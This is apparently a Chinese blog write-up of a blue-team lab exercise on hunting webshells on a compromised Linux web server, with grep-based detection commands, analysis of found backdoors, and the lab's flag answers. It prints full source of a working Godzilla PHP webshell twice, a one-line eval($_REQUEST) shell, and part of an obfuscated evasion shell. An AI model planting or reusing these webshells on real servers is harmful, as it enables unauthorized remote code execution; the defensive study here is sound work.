---
title: 【玄机靶场】第一章 应急响应- webshell查杀
date: 2025-09-05
categories:
  - 靶场
  - 蓝队
image: images/43.webp
---
# 简介
```php
靶机账号密码 root xjwebshell
```
1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}
2.黑客使用的什么工具的shell github地址的md5 flag{md5}
3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx
4.黑客免杀马完整路径 md5 flag{md5}
# 开启靶场
![Pasted image 20250319203849](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319203849.png)
# 过程
## 一、flag1
**黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}**
搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征
```php
find ./ type f -name "*.jsp" | xargs grep "exec(" 
find ./ type f -name "*.php" | xargs grep "eval(" 
find ./ type f -name "*.asp" | xargs grep "execute(" 
find ./ type f -name "*.aspx" | xargs grep "eval(" 
```
对于免杀Webshell，可以查看是否使用编码
```php
find ./ type f -name "*.php" | xargs grep "base64_decode" 
```
命令解析：
```php
1. xargs：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，`xargs`将`find`命令找到的文件列表作为参数传递给`grep`命令。
2. `grep "eval("`：`grep`命令用于搜索文本，并输出匹配的行。这里`"eval("`是`grep`命令的搜索模式，用于查找包含`eval(`字符串的行。
```
一个一个进行尝试即可：
这里使用：
```php
find ./ type f -name "*.php" | xargs grep "eval(" 
```
发现了三个文件：
```php
./var/www/html/include/gz.php:          eval($payload);
./var/www/html/include/Db/.Mysqli.php:          eval($payload);
./var/www/html/shell.php:<?php phpinfo();@eval($_REQUEST[1]);?>
```
![Pasted image 20250319203939](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319203939.png)
打开gz.php文件
```php
root@ip-10-0-10-5:/# cd /var/www/html/include
root@ip-10-0-10-5:/var/www/html/include# ls
common.php  Db  default.htm  gz.php  index.htm  index.html  Model
root@ip-10-0-10-5:/var/www/html/include# cat gz.php
```
最后终于在gz.php里面发现了，这样一段代码：
```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
//027ccd04-5065-48b6-a32d-77c704a5e26d
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
                eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```
简单分析一下这段恶意代码；
1. `@session_start();`：启动会话
2. `@set_time_limit(0);`：设置脚本执行时间限制为无限制
3. `@error_reporting(0);`：关闭错误报告
4. `function encode($D,$K){...}`：定义了一个名为 `encode` 的函数，它接受两个参数 `$D` 和 `$K`。这个函数看起来像是一个简单的异或编码函数，用于对数据进行加密或解密。它使用 `$K` 作为密钥，对 `$D` 中的每个字符进行异或操作。
5. 接下来的几行代码定义了 `$payloadName`、`$key` 和 `$data` 变量。`$payloadName` 是用于存储有效载荷的会话变量名，`$key` 是用于编码的密钥，`$data` 是从 `php://input` 流中读取的数据。
6. `if ($data!==false){...}`：如果从 `php://input` 读取的数据不是 `false`（即成功读取了数据），则执行以下代码块。
7. `if (isset($_SESSION[$payloadName])){...}`：检查 `$payloadName` 对应的会话变量是否已设置。
8. `if (strpos($payload,"getBasicsInfo")===false){...}`：检查 `$payload` 变量中是否包含字符串 `"getBasicsInfo"`。
9. `eval($payload);`：如果 `$payload` 变量包含 `"getBasicsInfo"` 字符串，则执行 `$payload` 变量中的 PHP 代码。
10. `echo encode(@run($data),$key);`：如果 `$data` 包含 `"getBasicsInfo"` 字符串，则执行 `@run($data)` 函数，并将结果编码后输出。
**总结：**
```
这段代码的目的是接收通过 php://input 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。
```
最后找到flag；
```php
flag{027ccd04-5065-48b6-a32d-77c704a5e26d}
```
## 二、flag2
**黑客使用的什么工具的shell github地址的md5 flag{md5}**
遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；
为什么这样说？
哥斯拉病毒是一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：
```
1. @session_start(); - 开启一个会话。
2. @set_time_limit(0); - 设置脚本执行时间为无限。
3. @error_reporting(0); - 关闭所有错误报告。
```
这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。
所以我们只需要找到它的github地址并且进行MD5加密即可；
```
Godzilla地址：https://github.com/BeichenDream/Godzilla
```
直接使用md5加密网站对网站进行加密即可！
```
https://www.jyshare.com/front-end/703/
```
![Pasted image 20250319204711](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319204711.png)
```php
flag{39392de3218c333f794befef07ac9257}
```
## 三、flag3
**黑客使用的什么工具的shell github地址的md5 flag{md5}**
那既然说黑客隐藏shell了，那我们肯定需要用到命令ls -la进行查找；
然后发现在挨个查找的过程中发现.Mysqlli.php如果普通的ls查看目录是查不出来的，必须用到ls -la才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；
这里看到一个Db文件夹，然后进去查发现一个.Mysqli.php文件，cat打开一下发现是一个后门文件。
![Pasted image 20250319205049](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205049.png)
```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
                eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```
然后pwd一下看一下现在的绝对路径：
```php
root@ip-10-0-10-5:/var/www/html/include/Db# pwd
/var/www/html/include/Db
root@ip-10-0-10-5:/var/www/html/include/Db# 
```
然后就确定文件的绝对路径：
```
/var/www/html/include/Db/.Mysqli.php
```
然后进行MD5加密一下;
![Pasted image 20250319205347](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205347.png)
得到flag：
```
flag{aebac0e58cd6c5fad1695ee4d1ac1919}
```
## 四、flag4
**黑客免杀马完整路径 md5 flag{md5}**
什么是免杀马？
**免杀马**（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。
免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在/var/log目录下。
然后我们进入日志看一下日志文件：
进入日志文件夹后发现一个apache2的文件夹，说明网站使用了apache2进行搭建。
![Pasted image 20250319205732](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205732.png)
进去后，看一下access.log文件。
![Pasted image 20250319205826](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205826.png)
进去后，发现一个top.php执行了phpinfo()；且返回值为200，有点可疑。去找到相对应的文件发现是一个正常的文件来。
![Pasted image 20250319210029](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319210029.png)
打开文件发现是一个使用base64_decode进行编码混淆了。
```php
root@ip-10-0-10-5:/var/www/html# cd wap
root@ip-10-0-10-5:/var/www/html/wap# ls
index.php  template  top.php
root@ip-10-0-10-5:/var/www/html/wap# cat top.php 
<?php

$key = "password";

//ERsDHgEUC1hI
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
```
查看一下绝对路径：
```php
root@ip-10-0-10-5:/var/www/html/wap# pwd
/var/www/html/wap
root@ip-10-0-10-5:/var/www/html/wap# 
```
绝对路径：
```
/var/www/html/wap/top.php
```
然后进行MD5加密：
![Pasted image 20250319210635](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319210635.png)
flag：
```php
flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}
```
# 总结
1. **找webshell地址**
```php
//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征
find ./ type f -name "*.jsp" | xargs grep "exec(" 
find ./ type f -name "*.php" | xargs grep "eval(" 
find ./ type f -name "*.asp" | xargs grep "execute(" 
find ./ type f -name "*.aspx" | xargs grep "eval(" 
//对于免杀Webshell，可以查看是否使用编码
find ./ type f -name "*.php" | xargs grep "base64_decode" 
```
2. **分析一下webshell是什么工具**
```php
可以把代码复制出来进行查询,一般就是蚁剑，哥斯拉，等等
```
3. **找隐藏webshell**
```php
这个一般可以使用 ls -la  进行查看隐藏文件，主要需要细心找。
```
4. **找免杀码，看日志。**
```
access.log等等文件。
```